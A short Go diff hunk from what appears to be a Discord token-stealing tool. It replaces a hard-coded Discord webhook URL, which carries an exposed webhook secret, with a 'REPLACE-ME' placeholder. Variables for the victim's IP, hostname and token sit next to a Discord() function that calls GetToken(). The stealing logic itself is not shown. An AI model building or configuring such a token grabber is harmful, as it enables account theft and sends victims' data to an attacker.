@@ -56,7 +56,7 @@ var mIp string
 var mHostname string
 var osName string
 var mToken = ""
-var uWebhook = "https://discord.com/api/webhooks/1143737057966047243/haXW-ocaaOoFjRIRhZHvL24L-FvFfxrAsiUkRskrO39bcdZG7cja_zt3ZS76P6-HYpIe"
+var uWebhook = "REPLACE-ME"
 func Discord() {
 	GetToken()
 	GetDiscord()
